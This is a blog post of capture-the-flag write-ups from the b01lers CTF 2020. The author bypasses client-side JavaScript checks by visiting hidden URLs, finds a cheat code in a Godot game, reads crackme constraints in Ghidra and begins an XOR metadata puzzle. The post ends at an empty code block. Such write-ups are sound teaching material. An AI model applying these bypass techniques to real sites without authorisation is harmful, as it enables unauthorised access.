---
author: george_pick
layout: post
title: "Purdue University: b01lers CTF 2020"
excerpt: "Writeups for various challenges I solved during the 2020 b01lers capture the flag competition."
categories: [Capture The Flag]
---

> This is the CTF hosted by Purdue University's b01lers Capture the Flag team ... inspired by TAMUCTF to host a CTF that's beginner friendly, targeted at University-level players ... supplying solves, writeups, and source code for all challenges after the competition is over.
>
> The b01lers CTF will commence at 00:00 (Midnight) UTC on March 14, 2020 and run until 00:00 on March 16, 2020. That's 8:00PM EST March 13 - 8:00PM March 15 for y'all other Americans.
>
> [Discord](https://discord.gg/tBMqujE)
>
> `Unless otherwise specified, the flag format is pctf{...}.`

These are writeups to challenges I solved for this CTF.

## Solved

| Welcome Challenges    | Web     | Reverse Engineering     | Crypto    | PWN                               |
| [Welcome](#welcome)   | [Welcome to Earth](#welcome-to-earth) | [Dank Engine](#dank-engine) | [Harvesting Season](#harvesting-season) | [Department of Flying Vehicles](#department-of-flying-vehicles) |
| [Discord Flag](#discord-flag)| | [Chugga Chugga](#chugga-chugga) | | [Jumpdrive](#jumpdrive) |
|---
| | | | |


&nbsp;
&nbsp;
---

# A WELCOME CHALLENGE
## Welcome!

> Unless otherwise specified, the flag format is pctf{...}.
>
> This is a 48-Hour CTF. Details can be found at https://ctf.b01lers.com.
>
> pctf{all_ur_hack_are_belong_to_us}

Flag is `pctf{all_ur_hack_are_belong_to_us}`

## Discord Flag
> DESCRIPTION: Join our discord! discord.gg/tBMqujE
>
> Discord flag: pctf{should_have_used_irc}

Flag is `pctf{should_have_used_irc}`

# WEB

## Welcome to Earth
> DESCRIPTION: This was supposed to be my weekend off, but noooo, you got me out here, draggin' your heavy ass through the burning desert, with your dreadlocks sticking out the back of my parachute. You gotta come down here with an attitude, actin' all big and bad. And what the hell is that smell? I coulda been at a barbecue, but I ain't mad.
>
> `web.ctf.b01lers.com:1000`

Going to that page yields a message stating quick, you need to escape with a picture:

![]({{ site.baseurl }}/img/wte/f18.png)

But then it quickly sends us to a death screen:

![]({{ site.baseurl }}/img/wte/death.png)

Let's fetch that page with curl:

```html
curl http://web.ctf.b01lers.com:1000
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
  </head>
  <body>
    <h1>AMBUSH!</h1>
    <p>You've gotta escape!</p>
    <img src="/stati{{ site.baseurl }}/img/f18.png" alt="alien mothership" style="width:60vw;" />
    <script>
      document.onkeydown = function(event) {
        event = event || window.event;
        if (event.keyCode == 27) {
          event.preventDefault();
          window.location = "/chase/";
        } else die();
      };

      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

      async function dietimer() {
        await sleep(10000);
        die();
      }

      function die() {
        window.location = "/die/";
      }

      dietimer();
    </script>
  </body>
</html>
```

OK - so we need to give it keycode 27, which is [escape key](https://css-tricks.com/snippets/javascript/javascript-keycodes/).

OK - then we get to the next page, at `/chase`:

![]({{ site.baseurl }}/img/wte/chase.png)

Again, another quick "pick or die" page. Let's get the code again:

```html
curl http://web.ctf.b01lers.com:1000/chase/
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
  </head>
  <body>
    <h1>CHASE!</h1>
    <p>
      You managed to chase one of the enemy fighters, but there's a wall coming
      up fast!
    </p>
    <button onclick="left()">Left</button>
    <button onclick="right()">Right</button>

    <img
      src="/stati{{ site.baseurl }}/img/Canyon_Chase_16.png"
      alt="canyon chase"
      style="width:60vw;"
    />
    <script>
      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

      async function dietimer() {
        await sleep(1000);
        die();
      }

      function die() {
        window.location = "/die/";
      }

      function left() {
        window.location = "/die/";
      }

      function leftt() {
        window.location = "/leftt/";
      }

      function right() {
        window.location = "/die/";
      }

      dietimer();
    </script>
  </body>
</html>
```

OK - so both left and right give us death. But, `leftt` gets us to the next page. If we manually type that into the browser, we get the next page:

![]({{ site.baseurl }}/img/wte/takeshot.png)

Which has code:

```html
curl http://web.ctf.b01lers.com:1000/leftt/
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
  </head>
  <body>
    <h1>SHOOT IT</h1>
    <p>You've got the bogey in your sights, take the shot!</p>
    <img
      src="/stati{{ site.baseurl }}/img/locked.png"
      alt="locked on"
      style="width:60vw;"
    />
    </br>
    <button onClick="window.location='/die/'">Take the shot</button>
    <!-- <button onClick="window.location='/shoot/'">Take the shot</button> -->
  </body>
</html>
```

So, we need to uncomment the "good" onClick function before we click the button. Again, we can also just type `/shoot` into the browser, which takes us to the next page:

![]({{ site.baseurl }}/img/wte/crash.png)

Which has code:

```html
curl http://web.ctf.b01lers.com:1000/shoot/
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
  </head>
  <body>
    <h1>YOU SHOT IT DOWN!</h1>
    <p>Well done! You also crash in the process</p>
    <img src="/stati{{ site.baseurl }}/img/parachute.png" alt="parachute" style="width:60vw;" />
    <button onClick="window.location='/door/'">Continue</button>
  </body>
</html>
```

OK - next page is `/door`:

![]({{ site.baseurl }}/img/wte/door.png)

Holy radio buttons, Batman. Look at the code for the right one:

```html
curl http://web.ctf.b01lers.com:1000/door/
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
    <script src="/static/js/door.js"></script>
  </head>
  <body>
    <h1>YOU APPROACH THE ALIEN CRAFT!</h1>
    <p>How do you get inside?</p>
    <img src="/stati{{ site.baseurl }}/img/ship.png" alt="crashed ship" style="width:60vw;" />
    <form id="door_form">
      <input type="radio" name="side" value="0" />0
      <input type="radio" name="side" value="1" />1
      <input type="radio" name="side" value="2" />2
      <input type="radio" name="side" value="3" />3
      <input type="radio" name="side" value="4" />4
      <input type="radio" name="side" value="5" />5
      <input type="radio" name="side" value="6" />6
      <input type="radio" name="side" value="7" />7
      <input type="radio" name="side" value="8" />8
      <input type="radio" name="side" value="9" />9
      <input type="radio" name="side" value="10" />10
      <input type="radio" name="side" value="11" />11
      <input type="radio" name="side" value="12" />12
      <input type="radio" name="side" value="13" />13
      <input type="radio" name="side" value="14" />14
      <input type="radio" name="side" value="15" />15
      <input type="radio" name="side" value="16" />16
      <input type="radio" name="side" value="17" />17
      <input type="radio" name="side" value="18" />18
      <input type="radio" name="side" value="19" />19
      <input type="radio" name="side" value="20" />20
      <input type="radio" name="side" value="21" />21
      <input type="radio" name="side" value="22" />22
      <input type="radio" name="side" value="23" />23
      <input type="radio" name="side" value="24" />24
      <input type="radio" name="side" value="25" />25
      <input type="radio" name="side" value="26" />26
      <input type="radio" name="side" value="27" />27
      <input type="radio" name="side" value="28" />28
      <input type="radio" name="side" value="29" />29
      <input type="radio" name="side" value="30" />30
      <input type="radio" name="side" value="31" />31
      <input type="radio" name="side" value="32" />32
      <input type="radio" name="side" value="33" />33
      <input type="radio" name="side" value="34" />34
      <input type="radio" name="side" value="35" />35
      <input type="radio" name="side" value="36" />36
      <input type="radio" name="side" value="37" />37
      <input type="radio" name="side" value="38" />38
      <input type="radio" name="side" value="39" />39
      <input type="radio" name="side" value="40" />40
      <input type="radio" name="side" value="41" />41
      <input type="radio" name="side" value="42" />42
      <input type="radio" name="side" value="43" />43
      <input type="radio" name="side" value="44" />44
      <input type="radio" name="side" value="45" />45
      <input type="radio" name="side" value="46" />46
      <input type="radio" name="side" value="47" />47
      <input type="radio" name="side" value="48" />48
      <input type="radio" name="side" value="49" />49
      <input type="radio" name="side" value="50" />50
      <input type="radio" name="side" value="51" />51
      <input type="radio" name="side" value="52" />52
      <input type="radio" name="side" value="53" />53
      <input type="radio" name="side" value="54" />54
      <input type="radio" name="side" value="55" />55
      <input type="radio" name="side" value="56" />56
      <input type="radio" name="side" value="57" />57
      <input type="radio" name="side" value="58" />58
      <input type="radio" name="side" value="59" />59
      <input type="radio" name="side" value="60" />60
      <input type="radio" name="side" value="61" />61
      <input type="radio" name="side" value="62" />62
      <input type="radio" name="side" value="63" />63
      <input type="radio" name="side" value="64" />64
      <input type="radio" name="side" value="65" />65
      <input type="radio" name="side" value="66" />66
      <input type="radio" name="side" value="67" />67
      <input type="radio" name="side" value="68" />68
      <input type="radio" name="side" value="69" />69
      <input type="radio" name="side" value="70" />70
      <input type="radio" name="side" value="71" />71
      <input type="radio" name="side" value="72" />72
      <input type="radio" name="side" value="73" />73
      <input type="radio" name="side" value="74" />74
      <input type="radio" name="side" value="75" />75
      <input type="radio" name="side" value="76" />76
      <input type="radio" name="side" value="77" />77
      <input type="radio" name="side" value="78" />78
      <input type="radio" name="side" value="79" />79
      <input type="radio" name="side" value="80" />80
      <input type="radio" name="side" value="81" />81
      <input type="radio" name="side" value="82" />82
      <input type="radio" name="side" value="83" />83
      <input type="radio" name="side" value="84" />84
      <input type="radio" name="side" value="85" />85
      <input type="radio" name="side" value="86" />86
      <input type="radio" name="side" value="87" />87
      <input type="radio" name="side" value="88" />88
      <input type="radio" name="side" value="89" />89
      <input type="radio" name="side" value="90" />90
      <input type="radio" name="side" value="91" />91
      <input type="radio" name="side" value="92" />92
      <input type="radio" name="side" value="93" />93
      <input type="radio" name="side" value="94" />94
      <input type="radio" name="side" value="95" />95
      <input type="radio" name="side" value="96" />96
      <input type="radio" name="side" value="97" />97
      <input type="radio" name="side" value="98" />98
      <input type="radio" name="side" value="99" />99
      <input type="radio" name="side" value="100" />100
      <input type="radio" name="side" value="101" />101
      <input type="radio" name="side" value="102" />102
      <input type="radio" name="side" value="103" />103
      <input type="radio" name="side" value="104" />104
      <input type="radio" name="side" value="105" />105
      <input type="radio" name="side" value="106" />106
      <input type="radio" name="side" value="107" />107
      <input type="radio" name="side" value="108" />108
      <input type="radio" name="side" value="109" />109
      <input type="radio" name="side" value="110" />110
      <input type="radio" name="side" value="111" />111
      <input type="radio" name="side" value="112" />112
      <input type="radio" name="side" value="113" />113
      <input type="radio" name="side" value="114" />114
      <input type="radio" name="side" value="115" />115
      <input type="radio" name="side" value="116" />116
      <input type="radio" name="side" value="117" />117
      <input type="radio" name="side" value="118" />118
      <input type="radio" name="side" value="119" />119
      <input type="radio" name="side" value="120" />120
      <input type="radio" name="side" value="121" />121
      <input type="radio" name="side" value="122" />122
      <input type="radio" name="side" value="123" />123
      <input type="radio" name="side" value="124" />124
      <input type="radio" name="side" value="125" />125
      <input type="radio" name="side" value="126" />126
      <input type="radio" name="side" value="127" />127
      <input type="radio" name="side" value="128" />128
      <input type="radio" name="side" value="129" />129
      <input type="radio" name="side" value="130" />130
      <input type="radio" name="side" value="131" />131
      <input type="radio" name="side" value="132" />132
      <input type="radio" name="side" value="133" />133
      <input type="radio" name="side" value="134" />134
      <input type="radio" name="side" value="135" />135
      <input type="radio" name="side" value="136" />136
      <input type="radio" name="side" value="137" />137
      <input type="radio" name="side" value="138" />138
      <input type="radio" name="side" value="139" />139
      <input type="radio" name="side" value="140" />140
      <input type="radio" name="side" value="141" />141
      <input type="radio" name="side" value="142" />142
      <input type="radio" name="side" value="143" />143
      <input type="radio" name="side" value="144" />144
      <input type="radio" name="side" value="145" />145
      <input type="radio" name="side" value="146" />146
      <input type="radio" name="side" value="147" />147
      <input type="radio" name="side" value="148" />148
      <input type="radio" name="side" value="149" />149
      <input type="radio" name="side" value="150" />150
      <input type="radio" name="side" value="151" />151
      <input type="radio" name="side" value="152" />152
      <input type="radio" name="side" value="153" />153
      <input type="radio" name="side" value="154" />154
      <input type="radio" name="side" value="155" />155
      <input type="radio" name="side" value="156" />156
      <input type="radio" name="side" value="157" />157
      <input type="radio" name="side" value="158" />158
      <input type="radio" name="side" value="159" />159
      <input type="radio" name="side" value="160" />160
      <input type="radio" name="side" value="161" />161
      <input type="radio" name="side" value="162" />162
      <input type="radio" name="side" value="163" />163
      <input type="radio" name="side" value="164" />164
      <input type="radio" name="side" value="165" />165
      <input type="radio" name="side" value="166" />166
      <input type="radio" name="side" value="167" />167
      <input type="radio" name="side" value="168" />168
      <input type="radio" name="side" value="169" />169
      <input type="radio" name="side" value="170" />170
      <input type="radio" name="side" value="171" />171
      <input type="radio" name="side" value="172" />172
      <input type="radio" name="side" value="173" />173
      <input type="radio" name="side" value="174" />174
      <input type="radio" name="side" value="175" />175
      <input type="radio" name="side" value="176" />176
      <input type="radio" name="side" value="177" />177
      <input type="radio" name="side" value="178" />178
      <input type="radio" name="side" value="179" />179
      <input type="radio" name="side" value="180" />180
      <input type="radio" name="side" value="181" />181
      <input type="radio" name="side" value="182" />182
      <input type="radio" name="side" value="183" />183
      <input type="radio" name="side" value="184" />184
      <input type="radio" name="side" value="185" />185
      <input type="radio" name="side" value="186" />186
      <input type="radio" name="side" value="187" />187
      <input type="radio" name="side" value="188" />188
      <input type="radio" name="side" value="189" />189
      <input type="radio" name="side" value="190" />190
      <input type="radio" name="side" value="191" />191
      <input type="radio" name="side" value="192" />192
      <input type="radio" name="side" value="193" />193
      <input type="radio" name="side" value="194" />194
      <input type="radio" name="side" value="195" />195
      <input type="radio" name="side" value="196" />196
      <input type="radio" name="side" value="197" />197
      <input type="radio" name="side" value="198" />198
      <input type="radio" name="side" value="199" />199
      <input type="radio" name="side" value="200" />200
      <input type="radio" name="side" value="201" />201
      <input type="radio" name="side" value="202" />202
      <input type="radio" name="side" value="203" />203
      <input type="radio" name="side" value="204" />204
      <input type="radio" name="side" value="205" />205
      <input type="radio" name="side" value="206" />206
      <input type="radio" name="side" value="207" />207
      <input type="radio" name="side" value="208" />208
      <input type="radio" name="side" value="209" />209
      <input type="radio" name="side" value="210" />210
      <input type="radio" name="side" value="211" />211
      <input type="radio" name="side" value="212" />212
      <input type="radio" name="side" value="213" />213
      <input type="radio" name="side" value="214" />214
      <input type="radio" name="side" value="215" />215
      <input type="radio" name="side" value="216" />216
      <input type="radio" name="side" value="217" />217
      <input type="radio" name="side" value="218" />218
      <input type="radio" name="side" value="219" />219
      <input type="radio" name="side" value="220" />220
      <input type="radio" name="side" value="221" />221
      <input type="radio" name="side" value="222" />222
      <input type="radio" name="side" value="223" />223
      <input type="radio" name="side" value="224" />224
      <input type="radio" name="side" value="225" />225
      <input type="radio" name="side" value="226" />226
      <input type="radio" name="side" value="227" />227
      <input type="radio" name="side" value="228" />228
      <input type="radio" name="side" value="229" />229
      <input type="radio" name="side" value="230" />230
      <input type="radio" name="side" value="231" />231
      <input type="radio" name="side" value="232" />232
      <input type="radio" name="side" value="233" />233
      <input type="radio" name="side" value="234" />234
      <input type="radio" name="side" value="235" />235
      <input type="radio" name="side" value="236" />236
      <input type="radio" name="side" value="237" />237
      <input type="radio" name="side" value="238" />238
      <input type="radio" name="side" value="239" />239
      <input type="radio" name="side" value="240" />240
      <input type="radio" name="side" value="241" />241
      <input type="radio" name="side" value="242" />242
      <input type="radio" name="side" value="243" />243
      <input type="radio" name="side" value="244" />244
      <input type="radio" name="side" value="245" />245
      <input type="radio" name="side" value="246" />246
      <input type="radio" name="side" value="247" />247
      <input type="radio" name="side" value="248" />248
      <input type="radio" name="side" value="249" />249
      <input type="radio" name="side" value="250" />250
      <input type="radio" name="side" value="251" />251
      <input type="radio" name="side" value="252" />252
      <input type="radio" name="side" value="253" />253
      <input type="radio" name="side" value="254" />254
      <input type="radio" name="side" value="255" />255
      <input type="radio" name="side" value="256" />256
      <input type="radio" name="side" value="257" />257
      <input type="radio" name="side" value="258" />258
      <input type="radio" name="side" value="259" />259
      <input type="radio" name="side" value="260" />260
      <input type="radio" name="side" value="261" />261
      <input type="radio" name="side" value="262" />262
      <input type="radio" name="side" value="263" />263
      <input type="radio" name="side" value="264" />264
      <input type="radio" name="side" value="265" />265
      <input type="radio" name="side" value="266" />266
      <input type="radio" name="side" value="267" />267
      <input type="radio" name="side" value="268" />268
      <input type="radio" name="side" value="269" />269
      <input type="radio" name="side" value="270" />270
      <input type="radio" name="side" value="271" />271
      <input type="radio" name="side" value="272" />272
      <input type="radio" name="side" value="273" />273
      <input type="radio" name="side" value="274" />274
      <input type="radio" name="side" value="275" />275
      <input type="radio" name="side" value="276" />276
      <input type="radio" name="side" value="277" />277
      <input type="radio" name="side" value="278" />278
      <input type="radio" name="side" value="279" />279
      <input type="radio" name="side" value="280" />280
      <input type="radio" name="side" value="281" />281
      <input type="radio" name="side" value="282" />282
      <input type="radio" name="side" value="283" />283
      <input type="radio" name="side" value="284" />284
      <input type="radio" name="side" value="285" />285
      <input type="radio" name="side" value="286" />286
      <input type="radio" name="side" value="287" />287
      <input type="radio" name="side" value="288" />288
      <input type="radio" name="side" value="289" />289
      <input type="radio" name="side" value="290" />290
      <input type="radio" name="side" value="291" />291
      <input type="radio" name="side" value="292" />292
      <input type="radio" name="side" value="293" />293
      <input type="radio" name="side" value="294" />294
      <input type="radio" name="side" value="295" />295
      <input type="radio" name="side" value="296" />296
      <input type="radio" name="side" value="297" />297
      <input type="radio" name="side" value="298" />298
      <input type="radio" name="side" value="299" />299
      <input type="radio" name="side" value="300" />300
      <input type="radio" name="side" value="301" />301
      <input type="radio" name="side" value="302" />302
      <input type="radio" name="side" value="303" />303
      <input type="radio" name="side" value="304" />304
      <input type="radio" name="side" value="305" />305
      <input type="radio" name="side" value="306" />306
      <input type="radio" name="side" value="307" />307
      <input type="radio" name="side" value="308" />308
      <input type="radio" name="side" value="309" />309
      <input type="radio" name="side" value="310" />310
      <input type="radio" name="side" value="311" />311
      <input type="radio" name="side" value="312" />312
      <input type="radio" name="side" value="313" />313
      <input type="radio" name="side" value="314" />314
      <input type="radio" name="side" value="315" />315
      <input type="radio" name="side" value="316" />316
      <input type="radio" name="side" value="317" />317
      <input type="radio" name="side" value="318" />318
      <input type="radio" name="side" value="319" />319
      <input type="radio" name="side" value="320" />320
      <input type="radio" name="side" value="321" />321
      <input type="radio" name="side" value="322" />322
      <input type="radio" name="side" value="323" />323
      <input type="radio" name="side" value="324" />324
      <input type="radio" name="side" value="325" />325
      <input type="radio" name="side" value="326" />326
      <input type="radio" name="side" value="327" />327
      <input type="radio" name="side" value="328" />328
      <input type="radio" name="side" value="329" />329
      <input type="radio" name="side" value="330" />330
      <input type="radio" name="side" value="331" />331
      <input type="radio" name="side" value="332" />332
      <input type="radio" name="side" value="333" />333
      <input type="radio" name="side" value="334" />334
      <input type="radio" name="side" value="335" />335
      <input type="radio" name="side" value="336" />336
      <input type="radio" name="side" value="337" />337
      <input type="radio" name="side" value="338" />338
      <input type="radio" name="side" value="339" />339
      <input type="radio" name="side" value="340" />340
      <input type="radio" name="side" value="341" />341
      <input type="radio" name="side" value="342" />342
      <input type="radio" name="side" value="343" />343
      <input type="radio" name="side" value="344" />344
      <input type="radio" name="side" value="345" />345
      <input type="radio" name="side" value="346" />346
      <input type="radio" name="side" value="347" />347
      <input type="radio" name="side" value="348" />348
      <input type="radio" name="side" value="349" />349
      <input type="radio" name="side" value="350" />350
      <input type="radio" name="side" value="351" />351
      <input type="radio" name="side" value="352" />352
      <input type="radio" name="side" value="353" />353
      <input type="radio" name="side" value="354" />354
      <input type="radio" name="side" value="355" />355
      <input type="radio" name="side" value="356" />356
      <input type="radio" name="side" value="357" />357
      <input type="radio" name="side" value="358" />358
      <input type="radio" name="side" value="359" />359
    </form>
    <button onClick="check_door()">Check</button>
  </body>
</html>
```

OK - we see when we click the button we'll execute `check_door()`, and in the top there's a reference to `/static/js/door.js`. Let's inspect that script in the developer console:

```js
function check_door() {
  var all_radio = document.getElementById("door_form").elements;
  var guess = null;

  for (var i = 0; i < all_radio.length; i++)
    if (all_radio[i].checked) guess = all_radio[i].value;

  rand = Math.floor(Math.random() * 360);
  if (rand == guess) window.location = "/open/";
  else window.location = "/die/";
}
```
So you'd have to get randomly lucky to guess the right one. Let's just go to `/open` instead.

![]({{ site.baseurl }}/img/wte/door_closed.png)

Which has code:

```html
curl http://web.ctf.b01lers.com:1000/open/
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
    <script src="/static/js/open_sesame.js"></script>
  </head>
  <body>
    <h1>YOU FOUND THE DOOR!</h1>
    <p>How do you open it?</p>
    <img src="/stati{{ site.baseurl }}/img/door.jpg" alt="door" style="width:60vw;" />
    <script>
      open(0);
    </script>
  </body>
</html>
```

And, inspecting `open_sesame`:

```
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function open(i) {
  sleep(1).then(() => {
    open(i + 1);
  });
  if (i == 4000000000) window.location = "/fight/";
}
```

OK - on to `/fight`:

![]({{ site.baseurl }}/img/wte/fight.png)

Which has code:

```html
curl http://web.ctf.b01lers.com:1000/fight/
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
    <script src="/static/js/fight.js"></script>
  </head>
  <body>
    <h1>AN ALIEN!</h1>
    <p>What do you do?</p>
    <img
      src="/stati{{ site.baseurl }}/img/alien.png"
      alt="door"
      style="width:60vw;"
    />
    </br>
    <input type="text" id="action">
    <button onClick="check_action()">Fight!</button>
  </body>
</html>
```

OK, `/static/js/fight.js`:

```js
// Run to scramble original flag
//console.log(scramble(flag, action));
function scramble(flag, key) {
  for (var i = 0; i < key.length; i++) {
    let n = key.charCodeAt(i) % flag.length;
    let temp = flag[i];
    flag[i] = flag[n];
    flag[n] = temp;
  }
  return flag;
}

function check_action() {
  var action = document.getElementById("action").value;
  var flag = ["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"];

  // TODO: unscramble function
}
```

We can do the challenge, but it's clear that the flag is: `pctf{hey_boys_im_baaaaaaaaaack!}`.

# REV
## Dank Engine
> Stop! Get out! This challenge is for GAMERS ONLY.
>
> Oh? You ARE a gamers? Then welcome to the greatest game on earth!
>
> [cd15135667f13cdda8f16de01ed6e070](https://storage.googleapis.com/b0ctf-deploy/dank_engine.tgz)

Inspecting the binary, and doing some googling for the extensions, it seems like a [Godot](https://godotengine.org/) game.

So, I first tried installing it on OSX:

```
brew cask install godot
...
==> Moving App 'Godot.app' to '/Applications/Godot.app'.
🍺  godot was successfully installed!
```

But, even after installing godot, I could not find a way to load the given files into the program.

I turned instead to an Ubuntu VM I had spun up in Virtualbox instead.

rsync the project file to that machine, and then you can just run the program from the command line, like so:

![]({{ site.baseurl }}/img/dankengine/run_from_cmdline.png)

Which will open up Godot automatically, and give us something that looks like so:

![]({{ site.baseurl }}/img/dankengine/pre_godmode.png)

Aside from the _**dank**_ Thomas, we find ourselves in a nice little 2D world. We can move ourselves left and right and jump using the expected W/A/S/D keys.

Exploring around the map, there's gray boundaries we can't go beyond, and "tracks" we can move on as floor.

I explored around the reachable map, and the flag was not to be found. It seemed as if we needed to clip outside the map to find the flag resting somewhere out there.

I started with `strings` against the project's data package:

```
strings DankEngine.pck
```

In here, there was quite a bit of informational stuff relating to the projects code. But, the following entries look to be the key:

```js
var g_cheat_stack
var g_god_mode
var key_evt_map = {
        "W":["up_evt_press","up_evt_release"],
        "A":["left_evt_press", "left_evt_release"],
        "S":["down_evt_press", "down_evt_release"],
        "D":["right_evt_press", "right_evt_release"],
        "Left":["left_action_evt_press", "left_action_evt_release"],
        "Right":["right_action_evt_press", "right_action_evt_release"],
        "Up":["up_action_evt_press", "up_action_evt_release"],
        "Down":["down_action_evt_press", "down_action_evt_release"],
		"P":["p_evt_press", "p_evt_release"],
		"U":["u_evt_press", "u_evt_release"],
		"R":["r_evt_press", "r_evt_release"],
		"G":["g_evt_press", "g_evt_release"],
		"0":["zero_evt_press", "zero_evt_release"]
```

Ooo - god mode, and a cheat stack! If we keep looking, we see the functions relating to our normal movement:

```js
func generate_key_event(ev):
	if ev is InputEventKey and OS.get_scancode_string(ev.scancode) in self.key_evt_map:
		if ev.pressed:
			self.call(self.key_evt_map[OS.get_scancode_string(ev.scancode)][0])
		else:
			self.call(self.key_evt_map[OS.get_scancode_string(ev.scancode)][1])
func up_evt_press():
	Input.action_press("up")
func left_evt_press():
	Input.action_press("left")
func down_evt_press():
	Input.action_press("down")
func right_evt_press():
	Input.action_press("right")
func left_action_evt_press():
	Input.action_press("left_action")
func right_action_evt_press():
	Input.action_press("right_action")
func up_action_evt_press():
	Input.action_press("up_action")
func down_action_evt_press():
	Input.action_press("down_action")
func up_evt_release():
	Input.action_release("up")
func left_evt_release():
	Input.action_release("left")
func down_evt_release():
	Input.action_release("down")
func right_evt_release():
	Input.action_release("right")
func left_action_evt_release():
	Input.action_release("left_action")
func right_action_evt_release():
	Input.action_release("right_action")
func up_action_evt_release():
	Input.action_release("up_action")
func down_action_evt_release():
	Input.action_release("down_action")
```

And the physics that relate to this:

```js
func _physics_process(delta):
	if Input.is_action_pressed("left"):
		self.g_velocity.x = -RUN_SPEED
	elif Input.is_action_pressed("right"):
		self.g_velocity.x = RUN_SPEED
	else:
		self.g_velocity.x = 0
	if Input.is_action_pressed("up") and not self.g_airborne and not self.g_god_mode:
		self.g_velocity.y -= JUMP_SPEED
		self.g_airborne = true
	if Input.is_action_pressed("up") and self.g_god_mode:
		self.g_velocity.y = -JUMP_SPEED
	elif Input.is_action_pressed("down") and self.g_god_mode:
		self.g_velocity.y = JUMP_SPEED
	elif self.g_god_mode:
		self.g_velocity.y = 0
	if not self.g_god_mode:
		self.g_velocity.y += GRAVITY * delta
	move_and_slide(self.g_velocity, Vector2(0, -1))
	if is_on_floor() or raycast_floor():
		if not self.g_god_mode:
			self.g_velocity.y = GRAVITY * delta
		self.g_airborne = false
	else:
		self.g_airborne = true
```

But, looking carefully there, we can break the law of physics if we can enable `g_god_mode`. If we look a bit more, we see what seems to be the events to do so:

```js
# Cheat Code Events
func p_evt_press():
	self.g_cheat_stack.clear()
func p_evt_release():
	self.g_cheat_stack.push_back("P")
func u_evt_press():
	pass
func u_evt_release():
	self.g_cheat_stack.push_back("U")
func r_evt_press():
	pass
func r_evt_release():
	self.g_cheat_stack.push_back("R")
func g_evt_press():
	pass
func g_evt_release():
	self.g_cheat_stack.push_back("G")
func zero_evt_press():
	pass
func zero_evt_release():
	self.g_cheat_stack.push_back("0")
	if self.g_cheat_stack == ["P", "U", "R", "G", "0", "0"]:
		self.g_god_mode = not self.g_god_mode
		$CollisionShape2D.disabled = not $CollisionShape2D.disabled
```

So, not only do we gain the ability to fly, but also to clip through walls! All we have to do is get `P U R G 0 0` on the cheat stack.

From the cheat event section above, it's easy to do so, just press those keys in order. To check, after doing so, press the up button, and see yourself hover:

![]({{ site.baseurl }}/img/dankengine/post_godmode.png)

Nice. Now we need to explore to find the world. I wandered around for a bit, but for brevity, here's where to clip out:

Before:

![]({{ site.baseurl }}/img/dankengine/left_clip.png)

After:

![]({{ site.baseurl }}/img/dankengine/right_clip.png)

Flying to the right some more, we finally find what looks to be the flag, in the form of 4 letter lines, typed vertically top to bottom:

![]({{ site.baseurl }}/img/dankengine/flag.gif)

Flag is `pctf{itwastimeforthomastogo_hehadseeneverything}`.


## Chugga Chugga
> Chugga Chugga -- 100
>
> "I think I can. I think I can. I think I can. I know I can!"
>
> They can. Can you?
>
> [4b40107fefecbbe9bd294e6403179eca](https://storage.googleapis.com/b0ctf-deploy/chugga_chugga.tgz)
>

I opened up the binary in Ghidra on OSX. Poking around the functions, we find something that looks like so:

&nbsp;
![]({{ site.baseurl }}/img/chugga_ghidra.png)
&nbsp;

So, it looks like we have a bunch of constraints on a char\* (string) array. If we manage to match all of them, we'll have the flag.

Some are obvious, as they give you the index and the expected char. Picking these off, you're left with something like so:

```
pctf{s4d_cXXYY4_nXXzXz}
00000000001111111111222
01234567890123456789012
```

The rest of the conditions are rough to work out by hand, but after a while of mental hacking, we ended up with the flag:

```
pctf{s4d_chugg4_n01zez}
```

And, finally, putting it in:

```
./chugga
We're in train car:  0
The door is locked, but luckily, you're the conductor! Input your code:
pctf{s4d_chugg4_n01zez}
You've done it! You've saved the train!
```

Flag is `pctf{s4d_chugg4_n01zez}`

(I've copped out here; mainly because I plan on hopefully trying to learn to do something similar in [Z3](https://github.com/Z3Prover/z3), so keep an eye out for that writeup :) )

# Crypto

## Harvesting Season
> Can you xor your way out of this? (Length of key: 4)
>
> [099ef33df584899b3c59eaeb5736acd4](https://storage.googleapis.com/b0ctf-deploy/harvesting_season.tgz)

We're given a single JPEG file for this one. If you open it in your favorite photo previewer, it looks legitimate:

&nbsp;
![]({{ site.baseurl }}/img/fr3sh_h4rv3st.jpg)
&nbsp;

Furthermore, if we inspect it's heading information, is has all the correct magic bits and JFIF/EXIF headers.

Hm... So what could it be? We can check the photos metadata, maybe there? I'll use `exiftool` on OSX:

```
exiftool fr3sh_h4rv3st.jpg
ExifTool Version Number         : 11.91
File Name                       : fr3sh_h4rv3st.jpg
Directory                       : .
File Size                       : 2.1 MB
File Modification Date/Time     : 2020:03:12 15:13:02-04:00
File Access Date/Time           : 2020:03:14 17:00:33-04:00
File Inode Change Date/Time     : 2020:03:14 17:00:31-04:00
File Permissions                : rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 1
Y Resolution                    : 1
Resolution Unit                 : None
Artist                          : 1921754512366910363569105a73727c592c5e5701715e571b76304d3625317c1b72744d0d1d354d0d1d73131c2c655e
Y Cb Cr Positioning             : Centered
Image Width                     : 3456
Image Height                    : 4608
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 3456x4608
Megapixels                      : 15.9
```

OK -- That looks good, still.

Except, that Artist string looks _**fishy**_. That looks like the encrypted data we're looking for!

We're given a hint that the key length is four bytes. Combine that with [knowing XOR is it's own inverse](https://bigpick.github.io/TodayILearned/articles/2020-03/xor-inverse), and we know the format of the expected key (`pctf{...}`) and we can find the key!

We can play around in the python interpreter to find out what the key they used to XOR the original string (read: answer) in.

We can use a command like so to do a XOR against two hex strings in Python:

```python
